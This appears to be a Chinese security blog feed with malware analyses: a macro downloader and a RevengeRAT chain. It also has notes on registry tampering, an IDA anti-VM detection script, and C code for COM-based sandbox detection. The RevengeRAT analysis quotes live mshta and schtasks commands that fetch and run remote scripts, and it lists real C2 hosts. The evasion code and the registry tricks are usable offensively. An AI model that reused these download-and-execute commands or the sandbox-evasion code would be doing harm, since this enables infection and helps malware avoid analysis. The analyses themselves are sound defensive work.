判断线程是否在模块中                    if (modname[0] == NULL)                    {                                    //modname是模块名的指针，可以比较是否是恶意模块名                        printf(&quot;线程不在模块中: th32ProcessID=%d, TID=%d  \n&quot;, process.th32ProcessID, te32.th32ThreadID);                        if (TerminateThread(hThread, -1))                        {                            printf(&quot;线程已被清理\n&quot;);                        }                    }                    modname[0] = NULL;                }            }        }        Flag -= 1;    }}</code></pre><p>如果病毒还有提权操作的话，我们也需要提高权限去对抗</p><p>常见的提权方式为调整令牌 详见</p>]]></content>
    
    
    
    <tags>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shellcode基础</title>
    <link href="/cray/2019/11/03/%E7%8E%B0%E5%9C%BA%E6%9C%A8%E9%A9%AC%E6%B8%85%E7%90%86%E5%BB%BA%E8%AE%AE/"/>
    <url>/cray/2019/11/03/%E7%8E%B0%E5%9C%BA%E6%9C%A8%E9%A9%AC%E6%B8%85%E7%90%86%E5%BB%BA%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><h3 id="文件隐藏"><a href="#文件隐藏" class="headerlink" title="文件隐藏"></a>文件隐藏</h3><p>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL]<br>CheckedValue = 0 //此时无法通过文件夹选项设置成功<br>CheckedValue = 1 //Windows默认值<br>把CheckedValue修改成Windows默认值1后，系统恢复正常。</p><p>[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden]<br>这个对隐藏文件有用</p><h3 id="关闭杀软"><a href="#关闭杀软" class="headerlink" title="关闭杀软"></a>关闭杀软</h3><p>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center\Feature]<br><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121113.png" srcset="/cray/img/loading.gif" alt="20191216121113.png"></p><h3 id="网络相关"><a href="#网络相关" class="headerlink" title="网络相关"></a>网络相关</h3><p>[SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List]</p><h3 id="safeBoot"><a href="#safeBoot" class="headerlink" title="safeBoot"></a>safeBoot</h3><p>[HKEY_CURRENT_USER\System\CurrentControlSet\Control\SafeBoot”]<br>[HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot”]</p><p>可递归删除，就不能进入安全模式</p>]]></content>
    
    
    
    <tags>
      
      <tag>木马</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用宏-DownLoder</title>
    <link href="/cray/2019/10/10/%E5%AE%8F%E7%97%85%E6%AF%92%E4%B8%8B%E8%BD%BD%E5%99%A8/"/>
    <url>/cray/2019/10/10/%E5%AE%8F%E7%97%85%E6%AF%92%E4%B8%8B%E8%BD%BD%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>FileName</th><th>FileType</th><th>MD5</th><th>Size</th></tr></thead><tbody><tr><td>58e4d0.xls</td><td>Downloader</td><td>3effeba64d9a1a4dd1bddaeb1858e4d0</td><td>346112  bytes</td></tr></tbody></table><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>带有恶意宏的office文件，加载dll，下载程序执行</p><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://img-blog.csdnimg.cn/20190920145944891.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p><h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><p>有宏，会在你允许宏运行的时候执行起来<br><img src="https://img-blog.csdnimg.cn/20190918202734525.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>首先会切换目录到<code>TMPT</code>下</p><p>然后会调用窗体<code>UserFrom1</code>的<code>Show</code>方法,也就值展示提示窗体<br><img src="https://img-blog.csdnimg.cn/20190918202835482.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>在展示的时候会执行<code>UserFrom_Activate()</code>函数，也就会调用<code>CreatGifFile</code>这个方法<br><img src="https://img-blog.csdnimg.cn/20190918202716893.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>这个方法在模块 modle1中定义<br><img src="https://img-blog.csdnimg.cn/20190918203052154.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>拼接在<code>TEMP</code>下的路径，根据系统位数走不同分支，我这里是win7 32位<br><img src="https://img-blog.csdnimg.cn/20190918203729411.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>下面会拷贝本身到上面拼接好的路径 <code>TempName</code>中，然后复制到<code>ZipName</code>中<br><img src="https://img-blog.csdnimg.cn/20190918205110760.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>会把<code>ZipName</code>文件按压缩包打开，取出<code>xl\embeddings\oleObject1.bin</code>保存到<code>Tmp\oleObject.bin</code>中<br><img src="https://img-blog.csdnimg.cn/20190918205329214.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190918205648726.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>最后会调用<code>ReadAndWriteExtractedBinFile</code>函数，这个函数是在<code>oleObject.bin</code>中找到MZ开头的字符区，然后读取指定字节保存<br><img src="https://img-blog.csdnimg.cn/20190918210305935.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>定义好MZ头标记，方便后面查找<br><img src="https://img-blog.csdnimg.cn/20190918210330686.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>循环查找<code>oleObject.bin</code>中MZ开头的数据，然后拷贝到<code>NewAr</code>数组中<br><img src="https://img-blog.csdnimg.cn/20190918210842310.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>将数组中的数据保存到<code>nm</code>中，也就是 <code>%APPDATA %+\exchange1.dll</code></p><p><img src="https://img-blog.csdnimg.cn/20190918211005818.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>然后程序返回<code>CreateGifFile</code>来执行关键代码，<code>k32LL</code>和<code>Amway</code> 都在模块2中定义<br><img src="https://img-blog.csdnimg.cn/20190918211226396.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br><code>k32LL()</code>其实是C语言中的<code>LoadLibraryW()</code><br><code>Amway</code>则是这个dll的一个导出函数</p><h3 id="exchange1-dll"><a href="#exchange1-dll" class="headerlink" title="exchange1.dll"></a>exchange1.dll</h3><p>有壳，先脱壳，这里就说说思路</p><p>这个壳动态开辟空间，将加密的代码放到这个新开空间中，找准时机，dump出来</p><p>然后你会发现还有UPX的壳，UPX就是容易了</p><p>脱完壳之后看导出表<br><img src="https://img-blog.csdnimg.cn/20190919212420668.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>到这里就可以看出来<code>Amway</code>其实是这个dll的到导出函数了</p><p><strong>这个dll是个下载器，能够下载程序执行</strong></p><p>但是首先会获取一系列系统信息</p><p>获取主机名<br><img src="https://img-blog.csdnimg.cn/20190919212558142.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>获取用户名<br><img src="https://img-blog.csdnimg.cn/20190919212740460.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>获取系统版本信息<br><img src="https://img-blog.csdnimg.cn/20190919212819680.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>枚举进程<br><img src="https://img-blog.csdnimg.cn/20190919212846287.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>然后将进程名按 <code>|</code>号隔开<br><img src="https://img-blog.csdnimg.cn/201909192130056.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>后面就开始构造上传数据头了<br><img src="https://img-blog.csdnimg.cn/20190919213616330.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>开始上传本机信息<br><img src="https://img-blog.csdnimg.cn/20190919213725137.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190919213759624.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>上传后会检测response的状态码是否是正常(200)<br><img src="https://img-blog.csdnimg.cn/20190919214012375.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>当上传配置后会get一个文件<br><img src="https://img-blog.csdnimg.cn/20190919214254175.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>这里会创建一个<code>%temp%\boots.exe</code>文件<br><img src="https://img-blog.csdnimg.cn/20190919214316698.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>打开文件，往里面写下载的数据<br><img src="https://img-blog.csdnimg.cn/20190919214453138.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>下面就是核心的地方了，新开一个进程，去执行这个下载的exe程序</p><p><img src="https://img-blog.csdnimg.cn/20190919214602693.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p><p>由于目前这个C2地址已经失效，无法获得下载数据，但是能肯定的是这个下载程序才是这个木马的核心，因为这个宏代码中没有用做任何持久化处理。</p><h2 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h2><table><thead><tr><th>域名</th><th>类型</th></tr></thead><tbody><tr><td><a href="https://office-teml-en.com/tw" target="_blank" rel="noopener">https://office-teml-en.com/tw</a></td><td>C&amp;C</td></tr></tbody></table><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该木马利用加载隐藏在xlsx中的dll来执行命令，根据不同系统释放不同文件，利用网络存储，可以随时改变攻击方式。<br>我们要时刻保持警惕，对未知文件保持怀疑的态度，安装安全软件。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Hexo</tag>
      
      <tag>Fluid</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重装环境</title>
    <link href="/cray/2019/10/10/%E9%87%8D%E8%A3%85%E7%8E%AF%E5%A2%83/"/>
    <url>/cray/2019/10/10/%E9%87%8D%E8%A3%85%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<h2 id="平台介绍"><a href="#平台介绍" class="headerlink" title="平台介绍"></a>平台介绍</h2><p>虚拟平台：Oracle VM VirtualBox </p><p>虚拟系统：cn_windows_7_ultimate_with_sp1_x64_dvd</p><p>下载工具：迅雷&amp;百度云</p><h2 id="虚拟平台"><a href="#虚拟平台" class="headerlink" title="虚拟平台"></a>虚拟平台</h2><p>这里选用VB的原因是因为之前用VM虚拟机做测试，写测试代码的时候速度非常的慢，很容易卡死，而且软件也有很多没必要的。</p><p>之前用了一次VB的虚拟机，感觉挺不错。所以这次就安装选用VB平台的试试。</p><p>本次选用VB版本为目前最新的 <code>6.0.18 r136238 (Qt5.6.2)</code></p><h2 id="虚拟系统"><a href="#虚拟系统" class="headerlink" title="虚拟系统"></a>虚拟系统</h2><p>因为工作原因，经常要测试系统的安全，这里使用最广泛的WIN7 64位来学习</p><p>这里系统镜像选MSDN的P2P链接下载</p><p>本次使用链接为，源比较好，使用迅雷非会员下载就能满速</p><pre><code>ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/</code></pre><h2 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h2><h3 id="虚拟机配置"><a href="#虚拟机配置" class="headerlink" title="虚拟机配置"></a>虚拟机配置</h3><p>我的安装配置如下，笔记本8G内存，虚拟机用3G差不多</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200323155932577.png" srcset="/cray/img/loading.gif" alt="image-20200323155932577"></p><p>然后等待系统安装完成，为了主机与虚拟机之间的大文件交流，可以添加一个共项文件夹来互传大文件</p><h3 id="虚拟机安装后的工作"><a href="#虚拟机安装后的工作" class="headerlink" title="虚拟机安装后的工作"></a>虚拟机安装后的工作</h3><h4 id="安装增强工具"><a href="#安装增强工具" class="headerlink" title="安装增强工具"></a>安装增强工具</h4><p>点击<strong>选项栏-&gt;设备-&gt;安装增强功能</strong>，然后打开<strong>我的电脑</strong>，打开<strong>CD驱动器</strong></p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200323160936523.png" srcset="/cray/img/loading.gif" alt="image-20200323160936523"></p><p>然后点击安装<code>VBoxWindowsAdditions</code>进行安装即可</p><p>安装完重启虚拟机安装成功</p><h4 id="配置共享目录和更新问题"><a href="#配置共享目录和更新问题" class="headerlink" title="配置共享目录和更新问题"></a>配置共享目录和更新问题</h4><p>这是为了虚拟机和主机之间传输文件</p><p>打开任意文件夹，输入<code>\\vboxsvr</code>，这个文件夹就是和主机同步通信的文件夹</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200323161501652.png" srcset="/cray/img/loading.gif" alt="image-20200323161501652"></p><p>将他创建一个快捷方式放到桌面，方便日后访问。</p><p>如果电脑正常联网，那么这时候会出现卡顿，是因为有windows update在更新，就会有一个netsvcs服务占用高内存，导致卡顿</p><p>修改配置如下</p><p>控制面板找到windows update 修改为从不更新</p><p><img src="C:%5CUsers%5CCray%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200323163842599.png" srcset="/cray/img/loading.gif" alt="image-20200323163842599"></p><h4 id="保存镜像"><a href="#保存镜像" class="headerlink" title="保存镜像"></a>保存镜像</h4><p>保存一个干净的镜像，这里创建一个系统快照，以后要恢复可以直接恢复到这个状态</p><p><img src="https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200323162101844.png" srcset="/cray/img/loading.gif" alt="image-20200323162101844"></p><p>以后有大更新也可以在这个基础上创建新的系统</p><h3 id="自定义安装"><a href="#自定义安装" class="headerlink" title="自定义安装"></a>自定义安装</h3><p>这里选择安装软件有</p><p>SysinternalsSuite套装</p><p>X96Dbg调试器</p><p>IDA7.0</p><p>OllDbg</p><p>Google Chrom</p><p>v2rayN</p>]]></content>
    
    
    
    <tags>
      
      <tag>VB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lunlayloo 木马</title>
    <link href="/cray/2019/09/06/Lunlayloo%20%E6%9C%A8%E9%A9%AC/"/>
    <url>/cray/2019/09/06/Lunlayloo%20%E6%9C%A8%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>FileName</th><th>FileType</th><th>MD5</th><th>Size</th></tr></thead><tbody><tr><td>Order____679873892.xls</td><td>rat</td><td>7641FEF8ABC7CB24B66655D11EF3DAF2</td><td>41472 bytes</td></tr></tbody></table><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>该样本语言类型为 VBS和JS编写，中间过程完全使用无文件格式，内容也都能随时在线更改，在一定程序上能躲避安全软件的查杀，通过不同混淆更容易达到免杀的效果。</p><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://img-blog.csdnimg.cn/20190920124614242.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p><h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><p>文件有宏，且宏有密码，可以使用<code>offkey</code>直接更改宏密码<br>进入宏代码后在<code>shell(fun)</code>处下断，可以拿到shell 的连接地址<br><img src="https://img-blog.csdnimg.cn/20190916212336956.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"> <code>mshta http://bit.ly/8hsshjahassahsh</code></p><p>打开这个页面看似是一个正常页面，但仔细查找是能在源码中找到恶意js代码的<br><img src="https://img-blog.csdnimg.cn/20190917141638561.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>拿出来使用<code>console</code>打印出来<br><img src="https://img-blog.csdnimg.cn/20190917141856253.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190917143320931.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>处理后执行了<code>WScript.Shell.Run mshta http://www.pastebin.com/raw/nv5d9pYu,vbHide</code><br>看看究竟是什么东西<br>木马作者选择了一个匿名代码存放地址网站，来逃避追踪。<br>但是目前这个RWA地址页面已经被删除了<br><img src="https://img-blog.csdnimg.cn/20190917143741625.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>这个样本在any.run上有人运行过，有记录，所以可以找到这个访问记录。<br><a href="https://app.any.run/tasks/0100486e-1711-4af6-a437-74ad27216f36/" target="_blank" rel="noopener">https://app.any.run/tasks/0100486e-1711-4af6-a437-74ad27216f36/</a><br><img src="https://img-blog.csdnimg.cn/20190917144032656.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>拿出这个代码<br><img src="https://img-blog.csdnimg.cn/20190917144558325.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>下面看看怎么玩的，关闭打开的excel word ppt msp软件，让中马的人以为想不到是宏的原因，给人 眼部见为净 的感觉</p><p><img src="https://img-blog.csdnimg.cn/20190917151722331.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p><p>接着又安装两个计划任务，来持久化攻击和进一步执行操作</p><p><code>schtasks /create /sc MINUTE /mo 60 /tn Windows Update /tr mshta.exe http://pastebin.com/raw/vXpe74L2 /F</code><img src="https://img-blog.csdnimg.cn/20190917154541622.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br><code>schtasks /create /sc MINUTE /mo 300 /tn Update /tr mshta.exe http://pastebin.com/raw/JdTuFmc5 /F</code><br><img src="https://img-blog.csdnimg.cn/20190917154555627.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>通过schtasks  创建两个计划任务来执行两个脚本文件<br>还加入了一个开启自启动<br><img src="https://img-blog.csdnimg.cn/2019091715561730.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p><p>接下来看看这三个脚本是怎么操作的</p><p><code>JdTuFmc5</code> 又是一系列加密，下面是解密后的结果</p><p><img src="https://img-blog.csdnimg.cn/20190919105945345.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>尝试去下载并执行两个.net编写的可执行程序，暂时命名为<code>bit1.bin</code>和<code>2bit1.bin</code>后面分析</p><p>在<code>wMG90xwi</code>这个raw中定义了一个<code>$a</code>对象，这个对象是将上面的bit1.bin读入内存的对象，可以直接使用<br><img src="https://img-blog.csdnimg.cn/20190919105430408.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>使用dnspy打开反编译这个dll</p><p>里面就有<code>THC452563sdfdsdfgr4777cxg04477fsdf810df777</code>类和它的方法<code>retrt477fdg145fd4g0wewerwedsa799221dsad4154qwe(string FTONJ, byte[] coco)</code> </p><p><img src="https://img-blog.csdnimg.cn/20190919110436546.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>然后使用<code>Invoke</code>去调用了这个方法，且传入的参数是(‘MSBuild.exe’,$f)</p><p>查一下壳，发现是加了<code>Confuser</code>的混淆</p><p>解完混淆之后再看<br><img src="https://img-blog.csdnimg.cn/20190920183121543.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>会按照顺序去检测文件<code>MSBuild.exe</code>存在在哪，然后调用<code>ticklens</code><br><img src="https://img-blog.csdnimg.cn/20190920183342286.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br><code>PEHeaderE</code>函数是在修改程序自身代码<br><img src="https://img-blog.csdnimg.cn/20190920184816602.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述">主要看<code>FUN</code><br><img src="https://img-blog.csdnimg.cn/20190920184846835.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>发现是在循环调用<code>smethod_0</code>方法，这个方法就是真正的创建傀儡进程</p><p><code>lpname</code> 指向要打开的进程</p><p><code>lpBuf</code> 是要注入的数据</p><p><img src="https://img-blog.csdnimg.cn/20190920185315420.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/2019092018553021.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190920185552483.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190920185722874.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190920185657512.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190920185749272.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>上面就是典型的进程注入  作用是将第二个可执行程序注入到<code>MSBuild.exe</code>中</p><p>这里就直接看一下 这个注入的程序到底是什么</p><p>反编译下一个2bit2.bin</p><p>根据关键字搜索，可以发现这是<code>RevengeRAT</code>远控生成的客户端<br><img src="https://img-blog.csdnimg.cn/20190920111854823.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>这个远控是一个有免费版本，网络上也有泄露的版本，因为是.net编写，基本功能也都能识别出来</p><p>首先是C2地址 <code>meandmyjoggar.duckdns.org:777</code></p><p>程序互斥体名 <code>RV_MUTEX-WindowsUpdateSysten32</code></p><p>两个计划任务和加入的启动项注册表都是一样的程序，这里就不累述了</p><p><strong>总的来说就是将远控代码注入到一个正常的程序中，来达到执行且躲避安全软件</strong></p><h2 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h2><table><thead><tr><th>域名</th><th>类型</th></tr></thead><tbody><tr><td><a href="http://www.pastebin.com/raw/nv5d9pYu" target="_blank" rel="noopener">http://www.pastebin.com/raw/nv5d9pYu</a></td><td>C&amp;C</td></tr><tr><td><a href="http://pastebin.com/raw/vXpe74L2" target="_blank" rel="noopener">http://pastebin.com/raw/vXpe74L2</a></td><td>C&amp;C</td></tr><tr><td><a href="http://pastebin.com/raw/JdTuFmc5" target="_blank" rel="noopener">http://pastebin.com/raw/JdTuFmc5</a></td><td>C&amp;C</td></tr><tr><td><a href="http://pastebin.com/raw/CGe3S2Vf" target="_blank" rel="noopener">http://pastebin.com/raw/CGe3S2Vf</a></td><td>C&amp;C</td></tr><tr><td><a href="https://pastebin.com/raw/wMG90xwi" target="_blank" rel="noopener">https://pastebin.com/raw/wMG90xwi</a></td><td>C&amp;C</td></tr><tr><td><a href="https://pastebin.com/raw/W455MkAZ" target="_blank" rel="noopener">https://pastebin.com/raw/W455MkAZ</a></td><td>C&amp;C</td></tr><tr><td>meandmyjoggar.duckdns.org:777</td><td>C&amp;C</td></tr></tbody></table><h2 id="查杀方案"><a href="#查杀方案" class="headerlink" title="查杀方案"></a>查杀方案</h2><p>关闭<code>MSBuild.exe</code>进程<br>删除计划任务名为<code>Windows Update</code>和<code>Update</code>的任务<br>删除<code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\AvastUpdate</code>表项<br>删除<code>Order____679873892.xls</code></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感染链复杂，控制解密繁琐，多方面控制持久化操作，无文件攻击，技术含量高。个人以及企业中需要时刻面对各种威胁，要时刻保持警惕，防患于未然。</p>]]></content>
    
    
    <categories>
      
      <category>样本详细分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Rat H-worm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDA 查找检测虚拟机代码</title>
    <link href="/cray/2019/09/05/ida%E6%9F%A5%E6%89%BE%E6%A3%80%E6%B5%8B%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A3%E7%A0%81/"/>
    <url>/cray/2019/09/05/ida%E6%9F%A5%E6%89%BE%E6%A3%80%E6%B5%8B%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A3%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<p>FindAntiVM <a href="https://github.com/zim123abc/virtualization-detection-ida-script/blob/dd8015ec6e130cf04272805730c78950b857c02b/src/findAntiVM.py" target="_blank" rel="noopener">来自github</a></p><p>如果找到，以红色标注</p><pre><code class="python">from idautils import *from idc import *heads = Heads(SegStart(ScreenEA()), SegEnd(ScreenEA()))#Calls to autorun/autorunsc -- these hide signed MS entries!!pill_check = [&#39;sidt&#39;, &#39;sgdt&#39;, &#39;sldt&#39;, &#39;smsw&#39;, &#39;str&#39;, &#39;in&#39;]malicious_check = [&#39;cmd&#39;,&#39;cpuid&#39;,&#39;autorun&#39;, &#39;autorunsc&#39;]vmware_check = [&#39;Vmtoolsd&#39;, &#39;Vmwaretrat&#39;, &#39;Vmwareuser&#39;, &#39;Vmacthlp&#39;]vbox_check = [&#39;vboxservice&#39;, &#39;vboxtray&#39;, &#39;VBOXBIOS&#39;]hostname_check = [&#39;brbrb-d8fb22af1&#39;,&#39;KVMKVMKVM&#39;, &#39;prl hyperv&#39;, &#39;Microsoft Hv&#39;, &#39;XenVMMXenVMM&#39;]env_check = [&#39;dmesg&#39;, &#39;kmods&#39;, &#39;pcidevs&#39;,&#39; dmidecode&#39;,&#39;sysfs&#39;,&#39;procfs&#39;, &#39;dashXmstdout&#39;]antiVM = []for i in heads:        for x in pill_check,vmware_check,vbox_check,hostname_check,env_check,malicious_check:                if GetMnem(i) in x:                     antiVM.append(i)#reset head to beginning of instructionsheads = Heads(SegStart(ScreenEA()), SegEnd(ScreenEA()))#Check out Hex View-A for I/O portsfor x in heads:        if GetMnem(x) == &quot;mov&quot; and &quot;eax&quot; in GetOpnd(x, 0) and &quot;564D5868h&quot; in GetOpnd(x, 1):                if GetMnem(x + 1) == &quot;mov&quot; and &quot;edx&quot; in GetOpnd(x + 1, 0) and &quot;5658h&quot; in GetOpnd(x + 1, 1):                        if GetMnem(x + 2) == &quot;in&quot; and &quot;eax&quot; in GetOpnd(x + 2, 0) and &quot;dx&quot; in GetOpnd(x + 2, 1):                                antiVM.append(x)        elif GetMnem(x) == &quot;call&quot; and &quot;RtlGetNativeSystemInformation&quot; in GetOpnd(x, 0):                antiVM.append(x)        if &quot;564D5868h&quot; in GetOpnd(x, 1) or &quot;5658h&quot; in GetOpnd(x, 1):                antiVM.append(x)for i in antiVM:    SetColor(i, CIC_ITEM, 0x0000ff)        instruction = GetMnem(i)    Message(&quot;Anti-VM: %08x &gt;&gt;&quot; % i)        Message(&quot; %s\n&quot; % instruction)print &quot;Number of potential Anti-VM instructions: %d&quot; % (len(antiVM))</code></pre><p>或者使用<code>ScoopyNG</code>工具检测</p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IDA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Com组建检测虚拟沙箱</title>
    <link href="/cray/2019/09/04/Com%E6%B7%BB%E5%8A%A0%E8%BF%87%E6%BB%A4%E5%99%A8%E6%9D%A5%E6%A3%80%E6%B5%8B%E6%B2%99%E7%AE%B1/"/>
    <url>/cray/2019/09/04/Com%E6%B7%BB%E5%8A%A0%E8%BF%87%E6%BB%A4%E5%99%A8%E6%9D%A5%E6%A3%80%E6%B5%8B%E6%B2%99%E7%AE%B1/</url>
    
    <content type="html"><![CDATA[<p>因为沙箱的仿真度不全问题，可能造成仿真系统上的音频设备功能与真机的差异，通过这来实现检测是否在沙箱中运行。</p><p>但经测试 <code>any.run</code> 和<code>微步</code> 都未被识别为沙箱</p><p>这里只是介绍下可以使用COM对系统基础设备的操作，来检测虚拟沙箱。</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;conio.h&gt;#include &lt;windows.h&gt;#include &lt;dshow.h&gt;#include &lt;objbase.h&gt;#pragma comment(lib, &quot;Strmiids.lib&quot;)void useCom(){    /*    这些只是一些随机检查，以确保恶意软件在真实系统上执行。    只有安装了音频设备，此处的沙箱才会被视为真实系统。    大多数仿真器都会失败，因为几乎不可能为现代操作系统中的每个COM接口实现适当的支持。    */    CoInitialize(0);    wchar_t * filerName = L&quot;random_name&quot;;    IGraphBuilder * pGraph;    CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&amp;pGraph);    if (E_POINTER != pGraph-&gt;AddFilter(NULL, filerName))    {        MessageBox(0,L&quot;E_POINTER != pGraph-&gt;AddFilter&quot;,0,0);        ExitProcess(-1);    }    //对一个简单的音频渲染器进行硝化，不检查错误代码，但是失败后pBaseFilter将被设置为NULL    IBaseFilter *pBaseFile;    CoCreateInstance(CLSID_AudioRender, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&amp;pBaseFile);    //试图找到刚刚添加的过滤器;如果以前未检查任何错误（或错误的仿真），此功能将无法找到过滤器，并且将成功检测到沙箱/仿真器。    pGraph-&gt;AddFilter(pBaseFile, filerName);    IBaseFilter *pBaseFile2;    pGraph-&gt;FindFilterByName(filerName, &amp;pBaseFile2);    if (pBaseFile2 == NULL)    {        MessageBox(0,L&quot;pBaseFile2==Null!!!&quot;,0,0);        ExitProcess(1);    }    //检查achName是不是之前添加的过滤器名    FILTER_INFO info = { 0 };    pBaseFile2-&gt;QueryFilterInfo(&amp;info);    if (wcscmp(info.achName,filerName)!=0)    {        MessageBox(0,L&quot;pBaseFile2 AddFilter error&quot;,0,0);        exit(0);    }    IReferenceClock *pClock;    if (pBaseFile2-&gt;GetSyncSource(&amp;pClock))    {        MessageBox(0,L&quot;pBaseFile2-&gt;GetSyncSource&quot;,0,0);        exit(0);    }    if (pClock != NULL)    {        exit(0);    }    CLSID clsID;    pBaseFile2-&gt;GetClassID(&amp;clsID);    if (clsID.Data1 == 0)    {        